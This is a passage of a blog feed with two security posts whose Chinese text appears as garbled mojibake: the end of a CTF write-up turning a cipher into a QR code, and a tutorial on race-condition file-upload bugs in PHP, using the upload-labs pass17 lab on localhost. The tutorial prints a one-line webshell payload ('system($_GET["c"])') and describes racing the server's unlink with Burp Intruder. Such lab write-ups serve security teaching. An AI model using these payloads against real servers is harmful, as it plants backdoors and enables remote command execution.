bash">https://wwa.lanzous.com/iNVbsoqrz8f<br>MTVDQw==<br></code></pre></td></tr></table></figure><p>æå–ç æ˜¯<code>MTVDQw==</code>ï¼ŒBase64è§£ç å¾—åˆ°<code>15CC</code>,ä¸‹è½½é™„ä»¶<br><img src="https://img-blog.csdnimg.cn/20210508211008367.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ä½¿ç”¨<a href="http://z.duoluosb.com/">åœ¨çº¿ç½‘ç«™</a>è¿›è¡Œç¤¾ä¼šä¸»ä¹‰æ ¸å¿ƒä»·å€¼è§‚è§£å¯†å¾—åˆ°</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">å£¹è´°åè‚†ä¼é™†æŸ’8ç–ã€‡å£¹2åè‚†56æŸ’89ã€‡å£¹23è‚†ä¼<br>é™†78901è´°3è‚†56æŸ’89ã€‡1è´°å4ä¼é™†7æŒç–0<br>å£¹2åè‚†ä¼6æŸ’89ã€‡å£¹è´°åè‚†5é™†æŸ’æŒ9ã€‡123è‚†5<br>é™†7æŒç–ã€‡1è´°345é™†æŸ’8ç–ã€‡å£¹è´°34567890<br>å£¹2åè‚†ä¼6æŸ’8ç–01è´°å4ä¼6æŸ’æŒç–ã€‡å£¹234ä¼<br>é™†78901è´°3è‚†5é™†78ç–0å£¹è´°345é™†7æŒç–0<br>å£¹è´°åè‚†ä¼é™†æŸ’890å£¹è´°åè‚†56æŸ’8ç–0å£¹234ä¼<br>67890123è‚†ä¼6æŸ’æŒç–ã€‡1è´°345é™†7890<br>å£¹è´°3è‚†56æŸ’æŒ90123è‚†56æŸ’æŒç–ã€‡å£¹è´°3è‚†5<br>67æŒ9ã€‡1234ä¼é™†78ç–ã€‡å£¹è´°3è‚†5é™†7æŒ9ã€‡<br>12åè‚†ä¼6æŸ’8901è´°åè‚†ä¼é™†7æŒ9ã€‡å£¹2åè‚†ä¼<br>é™†æŸ’89ã€‡123è‚†ä¼67890å£¹234567æŒç–0<br>å£¹2å4ä¼é™†æŸ’æŒ901è´°3è‚†56æŸ’æŒ9ã€‡å£¹2345<br>é™†78ç–0å£¹23è‚†ä¼67æŒ90å£¹2å4ä¼é™†7æŒ9ã€‡<br>å£¹2å45é™†æŸ’89ã€‡1è´°å45é™†7890å£¹23è‚†ä¼<br>é™†æŸ’8901234ä¼é™†æŸ’8ç–ã€‡1è´°34ä¼6æŸ’æŒç–0<br>å£¹è´°34ä¼é™†æŸ’89ã€‡å£¹2åè‚†5é™†æŸ’89ã€‡1è´°åè‚†ä¼<br>678901234ä¼67æŒ9ã€‡1234567890<br>å£¹è´°åè‚†ä¼é™†æŸ’8ç–0å£¹2å4ä¼6æŸ’8ç–ã€‡å£¹è´°åè‚†ä¼<br>é™†78901è´°3è‚†ä¼é™†7æŒ901è´°3è‚†56789ã€‡<br>å£¹2åè‚†ä¼6æŸ’89012345é™†æŸ’8ç–0å£¹è´°å4ä¼<br>é™†7æŒç–ã€‡1è´°3è‚†56789ã€‡1è´°3è‚†5é™†æŸ’æŒ9ã€‡<br>å£¹2åè‚†ä¼6æŸ’8ç–ã€‡1è´°345é™†æŸ’8ç–0å£¹è´°å4ä¼<br>é™†78901è´°3è‚†5678ç–01è´°3è‚†56789ã€‡<br>å£¹è´°åè‚†ä¼é™†æŸ’8ç–01è´°3è‚†ä¼é™†78ç–ã€‡å£¹è´°åè‚†ä¼<br></code></pre></td></tr></table></figure><p>æ±‰å­—è½¬æ¢æˆ1ï¼Œæ•°å­—æ¢æˆ0 ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">1111111011101100100110011<br>1000001010010010110110110<br>1011101001111101110100010<br>1011101000110111100000000<br>1011101010011010111110001<br>1000001010100101100010110<br>1111111000111100101010001<br>0000000011011110100010000<br>1101001100000100111111010<br>0010100001100111101010101<br>0011101000011111010110111<br>1100100011000001000000110<br>1010111100010100110110000<br>1001010011001001010110101<br>1010011001011001000010011<br>1100000001110110100101110<br>1100111001101101100101111<br>0000000001001010000000000<br>1111111010101010101111111<br>1000001011101000101000001<br>1011101000000001101011101<br>1011101010000010101011101<br>1011101011010001101011101<br>1000001010000100101000001<br>1111111010010111001111111<br></code></pre></td></tr></table></figure><p>25x25,ä¹‹å‰åšè¿‡ä¸€æ ·çš„ï¼Œç›´æ¥ä½¿ç”¨è„šæœ¬è½¬æ¢æˆäºŒç»´ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> PIL.Image<br>MAX = <span class="hljs-number">25</span><br>pic = PIL.Image.new(<span class="hljs-string">&quot;RGB&quot;</span>,(MAX,MAX))<br><span class="hljs-built_in">str</span> = <span class="hljs-string">&#x27;1111111011101100100110011100000101001001011011011010111010011111011101000101011101000110111100000000101110101001101011111000110000010101001011000101101111111000111100101010001000000001101111010001000011010011000001001111110100010100001100111101010101001110100001111101011011111001000110000010000001101010111100010100110110000100101001100100101011010110100110010110010000100111100000001110110100101110110011100110110110010111100000000010010100000000001111111010101010101111111100000101110100010100000110111010000000011010111011011101010000010101011101101110101101000110101110110000010100001001010000011111111010010111001111111&#x27;</span><br>i=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">0</span>,MAX):<br>        <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">0</span>,MAX):<br>                <span class="hljs-keyword">if</span>(<span class="hljs-built_in">str</span>[i] == <span class="hljs-string">&#x27;1&#x27;</span>):<br>                        pic.putpixel([x,y],(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>))<br>                <span class="hljs-keyword">else</span>:<br>                        pic.putpixel([x,y],(<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>))<br>                i = i+<span class="hljs-number">1</span><br>pic.show()<br>pic.save(<span class="hljs-string">&quot;flag.png&quot;</span>)<br></code></pre></td></tr></table></figure><p>æ‰«æäºŒç»´ç å¾—åˆ°flag</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>æ¯”èµ›å¤ç°</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Write up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æµ…ææ¡ä»¶ç«äº‰æ¼æ´</title>
    <link href="/2021/05/23/%E6%B5%85%E6%9E%90%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E/"/>
    <url>/2021/05/23/%E6%B5%85%E6%9E%90%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[ <a id="more"></a><h2 id="0x00-æ¡ä»¶ç«äº‰"><a href="#0x00-æ¡ä»¶ç«äº‰" class="headerlink" title="0x00-æ¡ä»¶ç«äº‰"></a>0x00-æ¡ä»¶ç«äº‰</h2><p>æ¡ä»¶ç«äº‰æ¼æ´æ˜¯ä¸€ç§æœåŠ¡å™¨ç«¯çš„æ¼æ´ï¼Œç”±äºæœåŠ¡å™¨ç«¯åœ¨å¤„ç†ä¸åŒç”¨æˆ·çš„è¯·æ±‚æ—¶æ˜¯å¹¶å‘è¿›è¡Œçš„ã€‚å¼€å‘è€…åœ¨è¿›è¡Œä»£ç å¼€å‘æ—¶å¸¸å¸¸å€¾å‘äºè®¤ä¸ºä»£ç ä¼šä»¥çº¿æ€§çš„æ–¹å¼æ‰§è¡Œï¼Œè€Œä¸”ä»–ä»¬å¿½è§†äº†å¹¶è¡ŒæœåŠ¡å™¨ä¼šå¹¶å‘æ‰§è¡Œå¤šä¸ªçº¿ç¨‹ï¼Œè¿™å°±ä¼šå¯¼è‡´æ„æƒ³ä¸åˆ°çš„ç»“æœï¼Œç®€è€Œè¨€ä¹‹å°±æ˜¯å¹¶æ²¡æœ‰è€ƒè™‘çº¿ç¨‹åŒæ­¥ã€‚å› æ­¤ï¼Œå¦‚æœå¹¶å‘å¤„ç†ä¸å½“æˆ–ç›¸å…³æ“ä½œé€»è¾‘é¡ºåºè®¾è®¡çš„ä¸åˆç†æ—¶ï¼Œå°†ä¼šå¯¼è‡´æ­¤ç±»é—®é¢˜çš„å‘ç”Ÿã€‚</p><h2 id="0x01-åŸºç¡€çŸ¥è¯†"><a href="#0x01-åŸºç¡€çŸ¥è¯†" class="headerlink" title="0x01-åŸºç¡€çŸ¥è¯†"></a>0x01-åŸºç¡€çŸ¥è¯†</h2><p>å…ˆæ¥äº†è§£ä¸€ä¸‹å…³äºæ¡ä»¶ç«äº‰çš„åŸºç¡€çŸ¥è¯†</p><p><strong>æ¡ä»¶ç«äº‰</strong>ï¼š<br>ç³»ç»Ÿä¸­ï¼Œæœ€å°çš„è¿ç®—è°ƒåº¦å•ä½æ˜¯çº¿ç¨‹ï¼Œè€Œæ¯ä¸ªçº¿ç¨‹åˆä¾é™„äºä¸€ä¸ªè¿›ç¨‹ï¼Œæ¡ä»¶ç«äº‰åˆ™æ˜¯å¤šè¿›ç¨‹ æˆ–å¤šçº¿ç¨‹å¯¹ä¸€ä¸ªå…±äº«èµ„æºæ“ä½œï¼Œå› ä¸ºæ“ä½œé¡ºåºä¸å—æ§çš„æ—¶å€™æ‰€äº§ç”Ÿçš„é—®é¢˜ã€‚</p><p><strong>è¿›ç¨‹</strong>ï¼š<br>è¿›ç¨‹æ˜¯ä¸ºäº†æ›´å¥½çš„åˆ©ç”¨CPUçš„èµ„æºï¼›è¿›ç¨‹æ˜¯ç³»ç»Ÿè¿›è¡Œèµ„æºåˆ†é…å’Œè°ƒåº¦çš„ä¸€ä¸ªç‹¬ç«‹å•ä½ï¼›æ¯ä¸ªè¿›ç¨‹éƒ½æœ‰è‡ªå·±çš„ç‹¬ç«‹å†…å­˜ç©ºé—´ï¼Œä¸åŒè¿›ç¨‹ é€šè¿‡è¿›ç¨‹é—´é€šä¿¡æ¥é€šä¿¡ï¼›ç”±äºè¿›ç¨‹æ¯”è¾ƒé‡è¦ï¼Œå æ®ç‹¬ç«‹çš„å†…å­˜ï¼Œæ‰€ä»¥ä¸Š ä¸‹æ–‡è¿›ç¨‹é—´çš„åˆ‡æ¢å¼€é”€ï¼ˆæ ˆã€å¯„å­˜å™¨ã€è™šæ‹Ÿå†… å­˜ã€æ–‡ä»¶å¥æŸ„ç­‰ï¼‰æ¯”è¾ƒå¤§ï¼Œä½†ç›¸å¯¹æ¯”è¾ƒç¨³å®šå®‰ å…¨ã€‚</p><p><strong>çº¿ç¨‹</strong>ï¼š<br>çº¿ç¨‹çš„æ˜¯ä¸ºäº†é™ä½ä¸Šä¸‹æ–‡åˆ‡æ¢çš„æ¶ˆè€—ï¼Œæé«˜ç³» ç»Ÿçš„å¹¶å‘æ€§ï¼Œå¹¶çªç ´ä¸€ä¸ªè¿›ç¨‹åªèƒ½å¹²ä¸€æ ·äº‹çš„ ç¼ºé™·ï¼Œä½¿åˆ°è¿›ç¨‹å†…å¹¶å‘æˆä¸ºå¯èƒ½ã€‚ çº¿ç¨‹æ˜¯è¿›ç¨‹çš„ä¸€ä¸ªå®ä½“,æ˜¯CPUè°ƒåº¦å’Œåˆ†æ´¾çš„åŸº æœ¬å•ä½,å®ƒæ˜¯æ¯”è¿›ç¨‹æ›´å°çš„èƒ½ç‹¬ç«‹è¿è¡Œçš„åŸºæœ¬å• ä½ã€‚çº¿ç¨‹è‡ªå·±åŸºæœ¬ä¸Šä¸æ‹¥æœ‰ç³»ç»Ÿèµ„æº,åªæ‹¥æœ‰ä¸€ç‚¹åœ¨ è¿è¡Œä¸­å¿…ä¸å¯å°‘çš„èµ„æº(å¦‚ç¨‹åºè®¡æ•°å™¨,ä¸€ç»„å¯„ å­˜å™¨å’Œæ ˆ),ä½†æ˜¯å®ƒå¯ä¸åŒå±ä¸€ä¸ªè¿›ç¨‹çš„å…¶ä»–çš„ çº¿ç¨‹å…±äº«è¿›ç¨‹æ‰€æ‹¥æœ‰çš„å…¨éƒ¨èµ„æºã€‚ çº¿ç¨‹é—´é€šä¿¡ä¸»è¦é€šè¿‡å…±äº«å†…å­˜ï¼Œä¸Šä¸‹æ–‡åˆ‡æ¢å¾ˆå¿«ï¼Œèµ„æºå¼€é”€è¾ƒå°‘ï¼Œä½†ç›¸æ¯”è¿›ç¨‹ä¸å¤Ÿç¨³å®šå®¹æ˜“ ä¸¢å¤±æ•°æ®ã€‚<br><strong>Sessionï¼š</strong><br>PHP session å˜é‡ç”¨äºå­˜å‚¨å…³äºç”¨æˆ·ä¼šè¯ï¼ˆsessionï¼‰çš„ä¿¡æ¯ï¼Œæˆ–è€…æ›´æ”¹ç”¨æˆ·ä¼šè¯ï¼ˆsessionï¼‰çš„è®¾ç½®ã€‚Session å˜é‡å­˜å‚¨å•ä¸€ç”¨æˆ·çš„ä¿¡æ¯ï¼Œå¹¶ä¸”å¯¹äºåº”ç”¨ç¨‹åºä¸­çš„æ‰€æœ‰é¡µé¢éƒ½æ˜¯å¯ç”¨çš„ã€‚</p><h2 id="0x02-æ¼æ´åˆ†æ"><a href="#0x02-æ¼æ´åˆ†æ" class="headerlink" title="0x02-æ¼æ´åˆ†æ"></a>0x02-æ¼æ´åˆ†æ</h2><p>æ”»å‡»è€…ä¸æ–­çš„å‘èµ·è®¿é—®è¯·æ±‚è®¿é—®è¯¥æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶ä¸€æ—¦è¢«æ‰§è¡Œï¼Œå°±ä¼šåœ¨æœåŠ¡å™¨ä¸Šç”Ÿæˆä¸€ä¸ªæ¶æ„çš„shellæ–‡ä»¶</p><p>é¦–å…ˆä¸Šä¼ ä¸€ä¸ªphpæ–‡ä»¶ï¼Œç„¶åæ£€æµ‹æ–‡ä»¶åç¼€åï¼Œå¦‚æœä¸ç¬¦åˆæ¡ä»¶ï¼Œå°±åˆ æ‰ï¼Œè™½ç„¶phpä»£ç åœ¨æ‰§è¡Œçš„æ—¶å€™æ˜¯çº¿æ€§æ‰§è¡Œä»£ç çš„ï¼Œä½†æ˜¯æ‰§è¡Œçš„æ—¶å€™å¯ä»¥æœ‰å¤šä¸ªçº¿ç¨‹ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>header(<span class="hljs-string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-variable">$ext</span> = substr(<span class="hljs-variable">$filename</span>,strrpos(<span class="hljs-variable">$filename</span>,<span class="hljs-string">&#x27;.&#x27;</span>) + <span class="hljs-number">1</span>);   <span class="hljs-comment">#åç¼€</span><br><br><span class="hljs-variable">$path</span> = <span class="hljs-string">&#x27;uploads/&#x27;</span> . <span class="hljs-variable">$filename</span>;<br><span class="hljs-variable">$tmp</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br><span class="hljs-keyword">if</span>(move_uploaded_file(<span class="hljs-variable">$tmp</span>, <span class="hljs-variable">$path</span>))&#123;<br><span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/php/i&#x27;</span>, <span class="hljs-variable">$ext</span>))&#123;   <span class="hljs-comment">#åˆ¤æ–­åç¼€æ˜¯å¦ä¸ºphp</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;upload success,file in &#x27;</span>.<span class="hljs-variable">$path</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>unlink(<span class="hljs-variable">$path</span>);    <span class="hljs-comment">#å·²ç»ä¸Šä¼ ååˆ¤æ–­è‹¥æ˜¯PHPåˆ™åˆ é™¤</span><br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;can&#x27;t upload php file!&quot;</span>);<br>&#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;upload error&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>ç»§ç»­ä¸Šä¼ ä¸€ä¸ªphpæ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php<br><span class="hljs-variable">$content</span>=<span class="hljs-string">&#x27;&lt;?php system($_GET[&quot;c&quot;]);?&gt;&#x27;</span>;<br>file_put_contents(<span class="hljs-string">&#x27;test.php&#x27;</span>,<span class="hljs-variable">$content</span>);<br>?&gt;<br></code></pre></td></tr></table></figure><p>åœ¨æ‰§è¡Œå®Œmove_uploaded_fileä¹‹åï¼Œæ‰§è¡Œunlinkä¹‹å‰ï¼Œæ­¤æ—¶è¿™ä¸ªphpæ–‡ä»¶æ˜¯å·²ç»ä¿å­˜åˆ°äº†webæœåŠ¡å™¨ä¸Šçš„ï¼Œå¹¶ä¸”æˆ‘ä»¬èƒ½å¤Ÿè®¿é—®ã€‚</p><p>å¦‚æœä¸Šä¼ çš„phpçš„åŠŸèƒ½æ˜¯å†™ä¸€å¥è¯åˆ°ä¸€ä¸ªphpæ–‡ä»¶ï¼Œè¿™æ ·æˆ‘ä»¬åœ¨åˆ é™¤ä¹‹å‰è®¿é—®è¯¥æ–‡ä»¶ï¼Œå°±ä¼šç”Ÿæˆä¸€ä¸ªä¸€å¥è¯æœ¨é©¬ï¼Œå°±å¯ä»¥å¾—åˆ°webshellã€‚ æ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨å¤šçº¿ç¨‹å¹¶å‘çš„ä¸æ–­è®¿é—®ä¸Šä¼ çš„æ–‡ä»¶ï¼ŒåŠ¡å™¨ä¸­çš„å‡½æ•°æ‰§è¡Œéƒ½æ˜¯éœ€è¦æ—¶é—´çš„ï¼Œå¦‚æœæˆ‘ä¸Šä¼ ä¸Šå»çš„æ–‡ä»¶åœ¨æ²¡è¢«åˆ é™¤çš„æ—¶å€™ï¼Œä¸€æ—¦æˆåŠŸè®¿é—®åˆ°äº†ä¸Šä¼ çš„æ–‡ä»¶ï¼Œé‚£ä¹ˆå®ƒå°±ä¼šå‘æœåŠ¡å™¨å†™å…¥shellã€‚</p><p>   ä¸€èˆ¬è€Œè¨€ï¼Œæˆ‘ä»¬æ˜¯ä¸Šä¼ äº†æ–‡ä»¶ï¼Œä½†æ˜¯æœ€åå´å› ä¸ºè¿‡æ»¤æˆ–è€…å› ä¸ºå…¶ä»–åŸå› è¢«åˆ é™¤äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ¡ä»¶ç«äº‰ï¼Œæˆ‘ä»¬å®é™…ä¸Šæ˜¯å’Œunlinkï¼Œä»¥åŠåˆ é™¤æ–‡ä»¶çš„å‡½æ•°è¿›è¡Œç«äº‰ã€‚æ–‡ä»¶è¢«è®¿é—®äº†ä¾æ—§å¯ä»¥åˆ é™¤ï¼Œå®ƒåˆ é™¤è·Ÿæˆ‘è®¿é—®æ²¡æœ‰ä»»ä½•å…³ç³»ã€‚</p><h2 id="0x03-CTFä¸­çš„æ¡ä»¶ç«äº‰"><a href="#0x03-CTFä¸­çš„æ¡ä»¶ç«äº‰" class="headerlink" title="0x03-CTFä¸­çš„æ¡ä»¶ç«äº‰"></a>0x03-CTFä¸­çš„æ¡ä»¶ç«äº‰</h2><h3 id="upload-libs-pass17"><a href="#upload-libs-pass17" class="headerlink" title="upload-libs pass17"></a>upload-libs pass17</h3><p>æºä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$ext_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<br>    <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>    <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    <span class="hljs-variable">$file_ext</span> = substr(<span class="hljs-variable">$file_name</span>,strrpos(<span class="hljs-variable">$file_name</span>,<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);<br>    <span class="hljs-variable">$upload_file</span> = <span class="hljs-variable">$UPLOAD_ADDR</span> . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$file_name</span>;<br><br>    <span class="hljs-keyword">if</span>(move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$upload_file</span>))&#123;<br>        <span class="hljs-keyword">if</span>(in_array(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$ext_arr</span>))&#123;<br>             <span class="hljs-variable">$img_path</span> = <span class="hljs-variable">$UPLOAD_ADDR</span> . <span class="hljs-string">&#x27;/&#x27;</span>. rand(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).date(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_ext</span>;<br>             rename(<span class="hljs-variable">$upload_file</span>, <span class="hljs-variable">$img_path</span>);<br>             <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&quot;</span>;<br>            unlink(<span class="hljs-variable">$upload_file</span>);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;ä¸Šä¼ å¤±è´¥ï¼&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>åˆ†æä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<span class="hljs-comment">//å­˜å‚¨åœ¨æœåŠ¡å™¨çš„æ–‡ä»¶çš„ä¸´æ—¶å‰¯æœ¬çš„åç§°</span><br></code></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬ä¸Šä¼ web shellæ–‡ä»¶æ—¶ï¼Œä¸ä¼šå…ˆé™åˆ¶phpç±»å‹æ–‡ä»¶ä¸Šä¼ ï¼Œå…ˆåˆ©ç”¨ä¸Šé¢çš„è¯­å¥æŠŠä¸Šä¼ çš„æ–‡ä»¶ä¸´æ—¶å­˜æ”¾ã€‚å†æ‰§è¡Œä¸‹é¢çš„ifè¯­å¥è¿›è¡Œæ–‡ä»¶ç±»å‹çš„é™åˆ¶å’Œæ–‡ä»¶åçš„æ—¶é—´æˆ³ã€‚ç„¶åæ‰§è¡Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$upload_file</span>))<span class="hljs-comment">//ç§»åŠ¨åˆ°æ–°æ–‡ä»¶å¤¹</span><br></code></pre></td></tr></table></figure><p>ç»•è¿‡æ€è·¯æ˜¯åˆ©ç”¨ä»£ç æ‰§è¡Œè¿‡ç¨‹æœ‰è€—è´¹æ—¶é—´çš„è¿‡ç¨‹ï¼Œä¸Šä¼ é€Ÿåº¦å¤§äºåŒ¹é…unlinkæ¡ä»¶å°±èƒ½æ˜¾ç¤ºwebshellç•Œé¢</p><p><strong>æ–¹æ³•ä¸€</strong>ï¼šä½¿ç”¨brupæŠ“åŒ…</p><p>ä½¿ç”¨burpsuiteæŠ“åŒ…ä¸Šä¼ shell.phpï¼Œä¸€ç›´é‡æ”¾ä¸Šä¼ æ–‡ä»¶</p><p>shell.phpå†…å®¹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> fputs(fopen(<span class="hljs-string">&#x27;pass.php&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>),<span class="hljs-string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>åªè¦è®¿é—®äº†shell.phpæ–‡ä»¶ï¼Œphpæ–‡ä»¶å°±ä¼šæˆåŠŸè§£ææ‰§è¡Œï¼Œè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªpass.phpï¼Œå†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼š<code>&lt;?php phpinfo();?&gt;</code><br><img src="https://img-blog.csdnimg.cn/20210414203927555.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç„¶åSend to lntruderï¼Œå¹¶ä¸”è¿›è¡Œä»¥ä¸‹çš„è®¾ç½®<br><img src="https://img-blog.csdnimg.cn/20210426193037110.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>Payloadè®¾ç½®<br><img src="https://img-blog.csdnimg.cn/20210426193244134.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ç„¶åä¸åœè®¿é—®<code>http://localhost/upload-labs/upload/shell.php</code>ï¼Œçˆ†ç 